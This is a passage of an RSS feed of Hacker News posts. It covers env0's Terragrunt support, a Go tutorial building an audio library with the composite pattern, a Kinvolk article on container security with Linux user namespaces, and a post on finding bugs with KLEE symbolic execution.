our friends at <a href="https://terragrunt.gruntwork.io/">Gruntwork</a>. You can also find them on <a href="https://github.com/gruntwork-io/terragrunt">GitHub</a>.</p><p>This is the easiest part! You can set up your templates with your existing Terragrunt repo’s the same way you set up your Terraform repo’s today. Just click <strong>Create New Template </strong>as you normally would, and then select <strong>Terragrunt.</strong></p><figure id="w-node-ac21758aba0c-f84b1cb7"><p><img alt="Image for post" src="https://assets.website-files.com/5dc3f52851595b160ba99670/5fe0bf5e6ddf8e5b7f302910_1*HXFhG-t4gi3F6lIr0WuyZA.png"></p></figure><p>From there, the template creation process is exactly the same as it is with your usual Terraform files. For more info on templates in env0, check out the docs <a href="https://docs.env0.com/docs/templates">here</a>.</p><p>For more content about env0, be sure to follow us on <a href="https://twitter.com/envZero">Twitter</a>, <a href="https://www.linkedin.com/company/env0">LinkedIn</a>, and subscribe to our <a href="https://www.youtube.com/channel/UC2rSNWiZ2bvIc5NalLTPjJA">YouTube</a> channel!</p><p>‍</p></div></div></div>]]>
            </description>
            <link>https://www.env0.com/blog/terragrunt-release</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520196</guid>
            <pubDate>Wed, 23 Dec 2020 17:58:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building an audio library using the composite pattern and higher-order functions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25520121">thread link</a>) | @makeworld
<br/>
December 23, 2020 | https://faiface.github.io/post/how-i-built-audio-lib-composite-pattern/ | <a href="https://web.archive.org/web/*/https://faiface.github.io/post/how-i-built-audio-lib-composite-pattern/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        

<p>Some people say that Go can’t express good abstractions. They mostly refer to the lack of generics.
That’s because in most object-oriented languages, people are used to creating abstractions around
types. In Go, the right way is to create abstractions around behaviour using interfaces. When you
follow this principle, you find that Go is very powerful at creating abstractions.</p>

<p>In this post, I am going to explore a way of creating abstractions using the <em>‘good old composite
pattern’</em> from the book called ‘Design patterns’. Combined with higher-order functions, this pattern
is not only powerful, but also convenient. I will</p>

<ol>
<li>Explain what the composite pattern is.</li>
<li>Show how it can be combined with <em>higher-order functions</em> and closures.</li>
<li>Present a way I used it to create an <strong>audio library</strong>.</li>
</ol>

<p><strong>Why the hell are you going to talk about design patterns? Those are for Java and Java is bad, we
don’t like design patterns in Go!</strong></p>

<p>Uhm, well, you’re right, we usually don’t like design patterns in Go. But, bear with me, this is
only going to be about one of them and it’s gonna be interesting, I promise.</p>

<h2 id="first-example-arithmetic-expressions">First example: arithmetic expressions</h2>

<p>The composite pattern revolves around a single idea:</p>

<p><strong><em>Everything satisfies a single interface and complex things are composed from simple ones.</em></strong></p>

<p>It might not be entirely clear what this means, so let’s dive directly into the code.</p>

<p>In this first example, we’ll be creating a system to create and evaluate arithmetic expressions. We
need to start by creating the <em>one single interface</em>. It’s clear that an interface representing an
<em>expression</em> will be the right choice. This way, we’ll be able to create simple expressions and
create more complicated expressions by composing simpler ones using various operators.</p>

<p>To make things even simpler, we won’t even define an interface. A function type is sufficient here.</p>

<pre><code>type Expr func() float64
</code></pre>

<p>So, an expression is a function which evaluates to <code>float64</code>. An interface equivalent would be an
interface with a single method, say <code>Eval</code>.</p>

<p>The most simple expression is one that returns a constant. Let’s call it <code>Const</code>. Here’s the
constructor.</p>

<pre><code>func Const(x float64) Expr {
        return func() float64 {
                return x
        }
}
</code></pre>

<p>Now we can define a composite constructor, say a one which sums other expressions. It takes an
aribirary number of other expressions and evaluates to their sum.</p>

<pre><code>func Sum(exs ...Expr) Expr {
        return func() float64 {
                sum := 0.0
                for _, ex := range exs {
                        sum += ex()
                }
                return sum
        }
}
</code></pre>

<p>The expression returned from the <code>Sum</code> constructor simply adds the results of the other expressions
together. Note, that we call <code>ex()</code> inside the loop, because the <code>Expr</code> type is a function and
calling it yields the result.</p>

<p>Now we have some material to start using our arithmetic expressions library.</p>

<pre><code>ex1 := Sum(Const(1), Const(2), Const(3))
fmt.Println(ex1()) // prints 6

ex2 := Sum(Const(1), Sum(Const(2), Const(3)))
fmt.Println(ex2()) // prints 6 alike
</code></pre>

<p>We can create more expressions. <code>Ref</code> always returns the value of a variable it is pointing to.</p>

<pre><code>func Ref(x *float64) Expr {
        return func() float64 {
                return *x
        }
}
</code></pre>

<p>And now we can do funny things :)</p>

<pre><code>x := 1.0
ex := Sum(Ref(&amp;x), Ref(&amp;x))

x = ex() // x = 2
x = ex() // x = 4
x = ex() // x = 8
x = ex() // x = 16
</code></pre>

<p>I think this is neat. This is just a little toy example, to give you the taste. Let’s go ahead to
another example. Still a toy one, but a little less toy one.</p>

<h2 id="second-example-sequences">Second example: sequences</h2>

<p>Now, we will use the composite pattern to assemble sequences of numbers. Finite or inifinite,
doesn’t matter.</p>

<p>Once again, we need to start by creating the single interface. Obviously, this interface will
represent a sequence. The interface will contain a single method called <code>Next</code>. This method returns
the next element in the sequence and <code>true</code> or <code>false</code> depending on whether we already reached the
end of the sequence.</p>

<pre><code>type Seq interface {
        Next() (x float64, ok bool)
}
</code></pre>

<p>We could use a function type again, but I decided to use a proper interface, for clarity.
Nonetheless, we can create a helper function type, which will simplify creating instances of the
interface.</p>

<pre><code>type SeqFunc func() (x float64, ok bool)

func (sf SeqFunc) Next() (x float64, ok bool) {
        return sf()
}
</code></pre>

<p>The <code>SeqFunc</code> is a function type which satisfies the <code>Seq</code> interface by implementing the <code>Next</code>
function returning the result of itself. This pattern is also used in the standard library with
<a href="https://golang.org/pkg/net/http/#HandlerFunc"><code>http.HandlerFunc</code></a>.</p>

<p>Let’s start creating actual <code>Seq</code> implementations.</p>

<p>The simplest one is a sequence created from a slice. We’ll call it <code>Mk</code> (make a sequence).</p>

<pre><code>func Mk(vals ...float64) Seq {
        i := 0
        return SeqFunc(func() (x float64, ok bool) {
                if i &gt;= len(vals) {
                        return 0, false
                }
                x = vals[i]
                i++
                return x, true
        })
}
</code></pre>

<p><code>Mk</code> sequence tracks the current index in the slice it was created from. Every time <code>Next</code> is
called, the current value is returned and the index is incremented. When we reach the end of the
slice, we simply return <code>0, false</code>.</p>

<p>A complement function to <code>Mk</code> is <code>Collect</code>, which takes a <code>Seq</code> and collects it into a slice of
numbers. This is obviously only applicable to finite sequences.</p>

<pre><code>func Collect(s Seq) []float64 {
        var vals []float64
        for {
                x, ok := s.Next()
                if !ok {
                        break
                }
                vals = append(vals, x)
        }
        return vals
}
</code></pre>

<p>Now, we can turn a slice into a sequence and back again, very useful.</p>

<pre><code>fmt.Println(Collect(Mk(1, 2, 3))) // prints [1 2 3]
</code></pre>

<p>We can create an infinite sequence of natural numbers.</p>

<pre><code>func Naturals() Seq {
        n := 0.0
        return SeqFunc(func() (x float64, ok bool) {
                n++
                return n, true
        })
}
</code></pre>

<p>And we can create a composite which takes <code>n</code> first elements out of any sequence.</p>

<pre><code>func Take(n int, s Seq) Seq {
        return SeqFunc(func() (x float64, ok bool) {
                if n &lt;= 0 {
                        return 0, false
                }
                n--
                return s.Next()
        })
}
</code></pre>

<p>Now, we can generate <code>n</code> first natural numbers.</p>

<pre><code>fmt.Println(Collect(Take(10, Naturals())))
// [1 2 3 4 5 6 7 8 9 10]
</code></pre>

<p>This is starting to feel like functional programming. And rightfully so. We are doing</p>

<ol>
<li>Composition</li>
<li>Lazy evaluation and infinite sequences</li>
<li>Too long expressions :)</li>
</ol>

<p>The first point is the most important. With the composite pattern, we’ve been able to create
building blocks and compose more complicated things out of them. Don’t believe me? Let’s create a
<code>Split</code> function, which takes a sequence and splits it into two sequences at a given index. <em>Just
watch!</em></p>

<pre><code>func Split(n int, s Seq) (l, r Seq) {
        return Mk(Collect(Take(n, s))...), s
}
</code></pre>

<p>That was easy! Make sure to understand it, should be fairly obvious.</p>

<p>To make the <code>Split</code> function, we didn’t have to write almost any code. All of the required pieces
were already present, we just needed to compose them in the right way. Hence, the composite pattern.</p>

<p>Let’s see how our <code>Split</code> function behaves.</p>

<pre><code>s := Take(7, Naturals())
l, r := Split(4, s)
fmt.Println(Collect(l), Collect(r))
// [1 2 3 4] [5 6 7]
</code></pre>

<p>Take seven naturals, split them at four and print the results. Simple, right?</p>

<p>When using the composite pattern, you’ll find it very easy to follow the DRY principle and you
usually end up writing much less code than otherwise.</p>

<p><strong>Excercise:</strong> Create a <code>Dup</code> (duplicate) function, which takes a <code>Seq</code> and returns two <code>Seq</code>s which
are both identical (in terms of elements) to the original <code>Seq</code>. It should work for infinite
sequences too.</p>

<h2 id="real-thing-beep-audio-library">Real thing: Beep audio library</h2>

<p>Now that you’ve certainly got a hang of the composite pattern, let’s see how it can be used in a
real library. The library I’m talking about is an audio library I’ve been working on for the past
month. It’s called <a href="https://github.com/faiface/beep">Beep</a>, which is a name chosen from a <a href="https://www.reddit.com/r/golang/comments/6n1plq/choose_the_name_for_a_new_audio_library_in_go/">poll on
Reddit</a>.</p>

<p>First things first, the library is by no means only my work. The playback heavily depends on Hajime
Hoshi’s <a href="https://godoc.org/github.com/hajimehoshi/oto">Oto</a> library and MP3 decoding depends on his
<a href="https://github.com/hajimehoshi/go-mp3">go-mp3</a> package.</p>

<p>The library is built around the composite pattern, for a great good. Let’s take a look!</p>

<h3 id="the-streamer-interface">The <code>Streamer</code> interface</h3>

<p>As usual, when designing around the composite pattern, the first thing is the single interface. In
case of Beep, this single interface is called <code>Streamer</code>. It’s very similar to the former one,
<code>Seq</code>.</p>

<p>Audio is composed of elements called
<a href="https://en.wikipedia.org/wiki/Sampling_(signal_processing)"><em>samples</em></a>. A sample is a number on the
timeline in the interval [-1, +1] which specifies the pressure of the air at that moment. A
<code>Streamer</code> is pretty much a sequence of samples. However, getting the samples one by one as with
<code>Seq</code> would be way too inefficient. That’s why the <code>Streamer</code> interface is designed to stream a
number of samples at once.</p>

<p>Here’s how it looks like.</p>

<pre><code>type Streamer interface {
        Stream(samples [][2]float64) (n int, ok bool)
        Err() error
}
</code></pre>

<p>The <code>Stream</code> method is given a slice of samples (there are two numbers per sample, the left and the
right channel), fills it with samples and advances the internal state (if any). It returns the
number of samples it streamed (filled in the slice). If the <code>Streamer</code> already reached it’s end and
has no samples to stream, it returns <code>false</code>. Otherwise, it returns <code>true</code>. The complete description
can be found in the <a href="https://godoc.org/github.com/faiface/beep#Streamer">docs</a>.</p>

<p>The <code>Err</code> method is for handling errors, such as file and network errors. Errors are kept out of the
<code>Stream</code> method to simplify composition.</p>

<p>Similar to <code>Seq</code>, there is a helper function type which enables easy creation of <code>Streamer</code>s that
can’t error.</p>

<pre><code>type StreamerFunc func(samples [][2]float64) (n int, ok bool)
</code></pre>

<h3 id="loading-audio-files">Loading audio files</h3>

<p>Enough talking, let’s get to the code.</p>

<p>The simplest way to create a streamer is from an audio file. Beep currently supports
<a href="https://godoc.org/github.com/faiface/beep/wav">WAV</a> and
<a href="https://godoc.org/github.com/faiface/beep/mp3">MP3</a> formats. …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://faiface.github.io/post/how-i-built-audio-lib-composite-pattern/">https://faiface.github.io/post/how-i-built-audio-lib-composite-pattern/</a></em></p>]]>
            </description>
            <link>https://faiface.github.io/post/how-i-built-audio-lib-composite-pattern/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520121</guid>
            <pubDate>Wed, 23 Dec 2020 17:52:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Improving Kubernetes and container security with user namespaces]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25520063">thread link</a>) | @blixtra
<br/>
December 23, 2020 | https://kinvolk.io/blog/2020/12/improving-kubernetes-and-container-security-with-user-namespaces/ | <a href="https://web.archive.org/web/*/https://kinvolk.io/blog/2020/12/improving-kubernetes-and-container-security-with-user-namespaces/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- * Take content from https://docs.google.com/document/d/1nYNRrzcfwJTEJ9ulQ9WFxUL0KqPuvwg1Wbi9E8mrHDs/edit -->

<p><strong>Author:</strong> Alban Crequy</p>
<p>In this blog post, I will introduce user namespaces, explain why they are useful for containers and how they interact with Linux capabilities and filesystems. Then, I will explain the work we’ve done on two user namespace projects with Netflix: adding unprivileged user namespace support to FUSE and current work we’re doing to enable user namespaces in Kubernetes.</p>
<ul>
<li>


<a href="#what-are-user-namespaces">What are user namespaces?</a>

<ul>
<li>


<a href="#user-namespaces-and-capabilities">User namespaces and capabilities</a>
</li>
<li>


<a href="#user-namespaces-and-filesystems">User namespaces and filesystems</a>
</li>
<li>


<a href="#impact-on-container-security">Impact on container security</a>
</li>
</ul>
</li>
<li>


<a href="#enabling-user-namespaces-for-fuse-filesystems">Enabling user namespaces for FUSE filesystems</a>
</li>
<li>


<a href="#bringing-user-namespaces-to-kubernetes">Bringing user namespaces to Kubernetes</a>

<ul>
<li>


<a href="#cri-changes-for-user-namespaces">CRI changes for user namespaces</a>
</li>
<li>


<a href="#kubernetes-volumes">Kubernetes volumes</a>
</li>
</ul>
</li>
<li>


<a href="#conclusion">Conclusion</a>
</li>
</ul>
<h2 id="what-are-user-namespaces">What are user namespaces?</h2>
<p>Containers on Linux are not a first-class concept, instead they are built upon namespaces, cgroups and other Linux primitives. The Linux API offers different kinds of namespaces and they each isolate a specific aspect of the operating system. For example, two containers in different network namespaces will not see each other’s network interfaces. Two containers in different PID namespaces will not see each other’s processes.</p>
<p>


<a href="https://man7.org/linux/man-pages/man7/user_namespaces.7.html" target="_blank">User namespaces</a>
 are similar: they isolate user IDs and group IDs from each other. On Linux, all files and all processes are owned by a specific user id and group id, usually defined in /etc/passwd and /etc/group. A user namespace can be configured to let a container only see a subset of the host’s user IDs and group IDs.</p>
<p>In the example below, the two containers are configured to use distinct sets of user IDs, offering more isolation between themselves and between the containers and the host. Processes and files in <em>container 1</em> of the example might have the illusion of being <code>root</code> (user id 0), but are in fact using user id 100000 on the host.
</p>
<p><img src="https://kinvolk.io/media/2020-12-userns/image1.png" alt="2 containers as 2 different UIDs"></p>
<h3 id="user-namespaces-and-capabilities">User namespaces and capabilities</h3>
<p>This possibility to appear as user “<code>root</code>” in the container but, in fact, be another user is an important feature of user namespaces. To go in more details about this, let me first sum up the history of this feature in the Linux kernel:</p>
<ul>
<li>Before Linux 2.2, there was one user, “<code>root</code>” with user id 0, who could do privileged operations like configuring the network and mounting new filesystems. Regular users couldn’t do those privileged operations.</li>
<li>Since Linux 2.2, the privileges from the “root” user are split into different 


<a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">capabilities</a>
, e.g. <code>CAP_NET_ADMIN</code> to configure the network and <code>CAP_SYS_ADMIN</code> to mount a new filesystem.</li>
<li>Linux 3.8 introduced user namespaces in 2013 and, with it, capabilities are no longer global but interpreted in the context of a user namespace.</li>
</ul>
<p>As an example of what that means, we’ll consider the scenario where a container executes the program “<code>sshfs</code>” to mount a ssh filesystem using fuse. Mounting a filesystem requires the capability <code>CAP_SYS_ADMIN</code>. This is not something normally granted to containers as it would give them too much power and defeats the purpose of isolation between the host and container.</p>
<p>When a container is set up without a new user namespace, the only way to allow it to execute “<code>sshfs</code>” successfully is to give <code>CAP_SYS_ADMIN</code> to it, which is unfortunate due to the negative security implications discussed above—even though “<code>sshfs</code>” does not want to impact the host.</p>
<p><img src="https://kinvolk.io/media/2020-12-userns/image2.png" alt="PID, Mount Namespace, and Initial User Namespace"></p>
<p>But when the container is using a new user namespace, it can be given <code>CAP_SYS_ADMIN</code> in that user namespace without having <code>CAP_SYS_ADMIN</code> on the host user namespace. Being “root” (user id 0) in the container does not impact the host because the real user id is not root on the host.</p>
<p>More precisely, to mount a filesystem in the mount namespace of the container requires the process to have <code>CAP_SYS_ADMIN</code> in the user namespace owning that mount namespace.</p>
<p><img src="https://kinvolk.io/media/2020-12-userns/image3.png" alt="PID, Mount Namespace, and Unshared User Namesapce, from the Initial User Namespace"></p>
<h3 id="user-namespaces-and-filesystems">User namespaces and filesystems</h3>
<p>From the explanation above, it looks like thanks to user namespaces, it is possible to allow containers to mount filesystems without being root on the host. But depending on the filesystem, there are more pieces that come into play. Linux keeps a list of filesystems deemed safe for mounting in user namespaces, marked with the 


<a href="https://lwn.net/Articles/652468/" target="_blank"><code>FS_USERNS_MOUNT</code> flag</a>
. Creating a new mount in a non-initial user namespace is only allowed with those filesystem types. You can find the list in the Linux git repository with:</p>
<div><pre><code data-lang="shell">git grep -nw FS_USERNS_MOUNT
</code></pre></div><p>As you can see in the table below, new filesystem mounts in non-initial user namespaces were initially restricted to only procfs and sysfs, and then more and more filesystems were allowed along the years to be mounted in user namespaces. This is because it takes time to ensure that a filesystem is safe to use by unprivileged users.</p>
<table>
<thead>
<tr>
<th>filesystem</th>
<th>Allowed in user namespaces? (


<a href="https://lwn.net/Articles/652468/" target="_blank"><code>FS_USERNS_MOUNT</code> flag</a>
)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Procfs, sysfs</td>
<td>Yes, since Linux 3.8, 2012 (


<a href="https://github.com/torvalds/linux/commit/4f326c0064b20" target="_blank">4f326c0064b20</a>
)</td>
</tr>
<tr>
<td>tmpfs</td>
<td>Yes, since Linux 3.9, 2013 (


<a href="https://github.com/torvalds/linux/commit/b3c6761d9b5cc" target="_blank">b3c6761d9b5cc</a>
)</td>
</tr>
<tr>
<td>cgroupfs</td>
<td>Yes, since Linux 4.6, 2016 (


<a href="https://github.com/torvalds/linux/commit/1c53753e0df1a" target="_blank">1c53753e0df1a</a>
)</td>
</tr>
<tr>
<td>FUSE filesystem</td>
<td>Yes, since Linux 4.18, 2018 (


<a href="https://github.com/torvalds/linux/commit/4ad769f3c346" target="_blank">4ad769f3c346</a>
), or sooner on Ubuntu kernels</td>
</tr>
<tr>
<td>overlay filesystem</td>
<td>Yes, for (Linux 


<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=92dbc9dedccb9759c7f9f2f0ae6242396376988f" target="_blank">5.11</a>
, 2020, and sooner on Ubuntu kernels (


<a href="https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/bionic/commit/?id=3b7da90f28fe1ed4b79ef2d994c81efbc58f1144" target="_blank">patch</a>
))</td>
</tr>
<tr>
<td>NFS, ext4, btrfs, etc.</td>
<td>No</td>
</tr>
</tbody>
</table>
<h3 id="impact-on-container-security">Impact on container security</h3>
<p>User namespaces is another layer of security that isolates the host from the container. There has been a series of container vulnerabilities that were mitigated with user namespaces and it would be safe to assume that future vulnerabilities would be mitigated as well.</p>
<p>As an example, there was 


<a href="https://www.openwall.com/lists/oss-security/2019/02/11/2" target="_blank">CVE-2019-5736</a>
 (


<a href="https://github.com/opencontainers/runc/commit/0a8e4117e7f715d5fbeef398405813ce8e88558b" target="_blank">fix in runc</a>
) where the host runc binary could be overwritten from the container. The announcement of the vulnerability mentions that using user namespaces is one of the possible mitigations.</p>
<p>This is because even though the vulnerability allows a process in the container to have a reference to runc on the host via /proc/self/exe, the runc binary would be owned by a user (<code>root</code>) that is not mapped in the container. The container would perceive runc as belonging to the special user “<code>nobody</code>” and the “<code>root</code>” user in the container would not have write rights on it.</p>
<p>We had a 


<a href="https://kinvolk.io/blog/2019/02/runc-breakout-vulnerability-mitigated-on-flatcar-linux/" target="_blank">blog post</a>
 explaining the details of the issue and how Flatcar Container Linux mitigated it in a different way, by using a read-only filesystem for hosting the runc binary. The diagram below shows the sequence of steps used by runc to create a container, and how the /proc/self/exe can be a reference to runc. For more details about how that works, see our 


<a href="https://kinvolk.io/blog/2019/02/runc-breakout-vulnerability-mitigated-on-flatcar-linux/" target="_blank">blog post</a>
.</p>
<p><img src="https://kinvolk.io/media/2020-12-userns/image4.png" alt="runc does a fork and unshares namespaces"></p>
<p>The Kubernetes User Namespaces KEP (


<a href="https://github.com/kubernetes/enhancements/pull/2101" target="_blank">KEP/127</a>
) lists a couple of other vulnerabilities that can be mitigated with user namespaces.</p>
<h2 id="enabling-user-namespaces-for-fuse-filesystems">Enabling user namespaces for FUSE filesystems</h2>
<p>Before Linux 4.18, FUSE was not allowed in user namespaces but the effort to make it work was mostly complete: Ubuntu kernels already had a patch set to support it.</p>
<p>The missing part for Linux upstream was proper integration with the integrity subsystem, 


<a href="https://sourceforge.net/p/linux-ima/wiki/Home/" target="_blank">IMA</a>
 (Integrity Measurement Architecture). On Linux systems that use IMA, the kernel can detect if files are modified before allowing processes to read or execute them. It enables an audit trail of what is executed. It can also enable the Linux Extended Verification Module (EVM) to enforce a policy to only execute programs if their content is known to be good or signed by a trusted encryption key.</p>
<p>As opposed to files stored on a local hard disk with a traditional filesystem, files on filesystems such as FUSE can be modified without the kernel being able to re-measure, re-appraise, and re-audit files before being served.</p>
<p>We wrote a patch on the 


<a href="https://github.com/bbengfort/memfs" target="_blank">memfs FUSE driver</a>
 to demonstrate the following problem in this scenario:</p>
<ol>
<li>On the first request, the FUSE driver serves a file with its initial content.</li>
<li>IMA provides a measurement of the file.</li>
<li>On the second request, the FUSE driver serves the same file with an altered content.</li>
<li>IMA does not measure the content again so the altered content is not measured.</li>
</ol>
<p>At the time, there was a patch in discussion attempting to fix the issue with a “<code>force</code>” option in IMA that would force IMA to always re-measure, re-appraise, and re-audit files based on a policy, for example all files served by FUSE. We 


<a href="https://marc.info/?l=linux-integrity&amp;m=151559360514676&amp;w=2" target="_blank">tested</a>
 the effectiveness of that patch.</p>
<p>We sent several patch sets to explore different options.</p>
<p>The first option explored was to 


<a href="https://lore.kernel.org/patchwork/cover/872436/" target="_blank">patch</a>
 IMA so that it recognises FUSE filesystems as special and use the “<code>force</code>” option on them, so the measurements are performed for each request, even if the kernel didn’t detect any changes. We received the review that the IMA subsystem should not have to know the different filesystems in order to behave differently in the case of FUSE. Indeed, other filesystems could have the same issue such as remote filesystems. With this option, IMA needs to know about the behaviour of all filesystems, and it is putting this knowledge at the wrong layer.</p>
<p>In order to solve this, the second option explored was to 


<a href="https://www.mail-archive.com/linux-kernel@vger.kernel.org/msg1598387.html" target="_blank">introduce a new filesystem flag <code>FS_NO_IMA_CACHE</code></a>
 (


<a href="https://www.mail-archive.com/linux-kernel@vger.kernel.org/msg1587390.html" target="_blank">v1</a>
, 


<a href="https://www.mail-archive.com/linux-kernel@vger.kernel.org/msg1587678.html" target="_blank">v2</a>
, 


<a href="https://www.mail-archive.com/linux-kernel@vger.kernel.org/msg1592393.html" target="_blank">v3</a>
, 


<a href="https://www.mail-archive.com/linux-kernel@vger.kernel.org/msg1598387.html" target="_blank">v4</a>
) that allows filesystems to announce to the IMA subsystem their own behaviour with regard to caching. The IMA subsystem can then check the flag and use the “<code>force</code>” option if the flag is present. In that way, the IMA subsystem does not need to know about the different filesystems.</p>
<p>However, the IMA “<code>force</code>” option does not solve all the issues and signatures still can’t be verified meaningfully. In the end, the following 


<a href="https://lore.kernel.org/linux-integrity/1521999985.3541.32.camel@linux.vnet.ibm.com/" target="_blank">solution</a>
 was implemented in Linux 4.17 by IMA maintainers:</p>
<ul>
<li>Add a new flag <code>SB_I_IMA_UNVERIFIABLE_SIGNATURE</code> that filesystems can use to announce to IMA that their signatures cannot be verified.<br>
Right now, only FUSE filesystems make use of this flag. For more security, IMA users can use the IMA policy “fail_securely” that makes IMA signature verification on FUSE filesystems fail even without a user namespace.</li>
<li>Add another new flag <code>SB_I_UNTRUSTED_MOUNTER</code> that filesystems can use when  they are mounted from a user namespace that cannot be trusted. In that case, the IMA measurement would fail.</li>
</ul>
<p>After this IMA fix in Linux 4.17, FUSE filesystems in a non-initial user namespace are 


<a href="https://github.com/torvalds/linux/commit/4ad769f3c346ec3d458e255548dec26ca5284cf6" target="_blank">finally allowed</a>
 in …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kinvolk.io/blog/2020/12/improving-kubernetes-and-container-security-with-user-namespaces/">https://kinvolk.io/blog/2020/12/improving-kubernetes-and-container-security-with-user-namespaces/</a></em></p>]]>
            </description>
            <link>https://kinvolk.io/blog/2020/12/improving-kubernetes-and-container-security-with-user-namespaces/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520063</guid>
            <pubDate>Wed, 23 Dec 2020 17:46:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Finding Software Bugs Using Symbolic Execution]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25520031">thread link</a>) | @rsas
<br/>
December 23, 2020 | https://sasnauskas.eu/finding-software-bugs-using-symbolic-execution/ | <a href="https://web.archive.org/web/*/https://sasnauskas.eu/finding-software-bugs-using-symbolic-execution/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<article>
    <p>The idea of dynamic <em>symbolic execution</em> is to execute a piece of software on any input.
All possible execution paths are explored simultaneously without specifying concrete values.
Consider the following example where the input <code>x</code> is unknown, i.e., symbolic:</p>
<div><pre><code data-lang="c"><span>if</span> <span>(</span><span>x</span> <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
    <span>// ...
</span><span></span><span>}</span> <span>else</span> <span>if</span> <span>(</span><span>x</span> <span>&gt;</span> <span>100</span><span>)</span> <span>{</span>
    <span>// ...
</span><span></span><span>}</span> <span>else</span> <span>{</span>
    <span>assert</span><span>(</span><span>"should not reach this!"</span><span>)</span>
<span>}</span>
</code></pre></div><p>Symbolic execution runs this code on all three <em>execution paths</em> (<code>x&lt;0</code>, <code>x&gt;100</code>, <code>0&lt;=x&lt;=100</code>) and generates three concrete test cases: <code>x=-1</code>, <code>x=101</code> and <code>x=23</code> after hitting the assertion.</p>
<p>You don’t need to write test cases manually anymore.
You catch assertion failures and memory safety errors along the execution paths.
Ok, that is all in theory, but can this approach work for real-world programs in practice?</p>
<h3 id="klee">KLEE</h3>
<p><a href="https://klee.github.io/">KLEE</a> is a symbolic execution engine that executes unmodified, real-world programs on any input.
You compile your program to <a href="http://llvm.org/">LLVM</a> bitcode, mark some inputs as symbolic, and start KLEE.
KLEE explores possible execution paths using constraint solving and generates concrete test cases for each of them.
In case of a bug, you can replay your program with the input that triggered it.</p>
<p>In November 2019, the seminal <a href="http://llvm.org/pubs/2008-12-OSDI-KLEE.html">OSDI 2008 paper</a> on KLEE <a href="https://www.imperial.ac.uk/news/193808/paper-co-authored-professor-cadar-elected-acm/">has been elected to ACM SIGOPS Hall of Fame</a>.
Over the past decade, the research and application of KLEE resulted in over 150 scientific publications, dozens of Ph.D. theses, research grants, tools, and security startups.
On my behalf, I spent more than five years of my life with KLEE as well and learned a lot along the way.</p>
<h3 id="testing-network-protocols-using-klee">Testing Network Protocols Using KLEE</h3>
<p>In 2007, I struggled to find my research thesis until I came across Cristian Cadar’s paper <a href="https://www.doc.ic.ac.uk/~cristic/talks/exe-ccs-2006.pdf">“EXE: Automatically Generating Inputs of Death”</a>.
Inspired by the idea of symbolic execution, I asked myself the following question: <em>Can I mark the protocol header of an incoming network packet symbolic before passing it to the network stack?
If so, can I find protocol specification and implementation bugs with this technique?</em></p>
<p>I wrote an e-mail to Cristian Cadar and promptly received an answer.
Moreover, Cristian and Daniel Dunbar generously sent me the source code of KLEE, a new tool they were working on, even before its official release to the public.</p>
<p>In the following five years of my Ph.D. journey, I extended KLEE to execute several protocol stacks that talk to each other.
I applied this technique to test sensor networks and found a couple of interesting bugs in the Contiki OS described in my <a href="http://www.comsys.rwth-aachen.de/fileadmin/papers/2010/2010-04-ipsn-sasnauskas-KleeNet.pdf">IPSN 2010 paper</a>.
One of them caused a dead-lock of a sensor node inside the TCP/IP stack requiring a hardware reset.
It was a real bug observed in sensor network deployments.</p>
<p>I have not used KLEE actively since 2015 and was curious to give it a try (again).
Meanwhile, Contiki OS has been forked to <a href="https://github.com/contiki-ng/contiki-ng">Contiki-NG</a>.
I cloned the repo and compiled the test case called <code>20-packet-parsing</code> to LLVM bitcode.
Inside the test case, I marked the test packet buffer (~1KB) symbolic using KLEE’s <code>klee_make_symbolic</code> function.</p>
<p>After running for a couple of minutes on my old Mac, KLEE discovered two memory errors (out of bound pointers) while parsing certain protocols' headers.
I reported these findings with the concrete test cases to the security team of Contiki-NG for further analysis.
To me, this small test is yet another evidence that KLEE remains to be a useful research and test case generation tool.</p>
<h3 id="open-challenges-and-opportunities">Open Challenges and Opportunities</h3>
<p>Applying symbolic execution to arbitrary real-world programs is hard.
You often have to model the execution environment and find effective ways to cope with non-determinism and path explosion.
Moreover, many of the path constraints are difficult yet intractable to be solved in time with today’s solvers.</p>
<p>Nevertheless, studying and applying symbolic execution (using KLEE) opens many opportunities.
You will learn about program structure, compilers, SAT/SMT solvers, and how to write other kinds of testing tools.
Given this bag of knowledge, I wrote tools to <a href="https://www.cs.utah.edu/~regehr/papers/p1-sasnauskas.pdf">fuzz Android apps</a>, <a href="https://github.com/google/souper">superoptimize LLVM IR</a>, and more recently at work, a tool to <a href="https://arc.aiaa.org/doi/pdf/10.2514/6.2018-2665">fuzz satellite control procedures</a> written in SPELL.</p>
<p>Consider giving symbolic execution a try.
If you are a Ph.D. student and struggling to find a thesis topic in this area, <a href="http://matt.might.net/articles/phd-school-in-pictures/">don’t forget the bigger picture and keep pushing</a>.</p>
</article>

        </div></div>]]>
            </description>
            <link>https://sasnauskas.eu/finding-software-bugs-using-symbolic-execution/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520031</guid>
            <pubDate>Wed, 23 Dec 2020 17:43:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We rendered a million web pages to find out what makes the web slow]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25519928">thread link</a>) | @faitswulff
